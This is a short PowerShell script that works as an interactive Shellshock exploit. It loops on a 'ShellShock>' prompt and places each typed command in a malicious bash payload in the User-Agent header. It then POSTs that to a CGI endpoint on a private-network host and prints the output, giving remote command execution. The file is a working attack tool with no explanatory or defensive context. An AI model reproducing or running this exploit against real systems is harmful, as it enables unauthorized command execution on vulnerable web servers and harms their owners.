$cmd = ""
while($cmd -ne "exit")
{
    Write-Output "ShellShock> "
    $cmd = Read-Host
    function post_http ($url, $parameters)
    {
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length);
        $http_request.setRequestHeader("User-Agent", "() { :; }; /bin/bash -c 'ping -c 1 192.168.254.1;$cmd' ");
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $session=$http_request.responseText
        $session
    }

post_http http://192.168.254.145/cgi-bin/status 1
}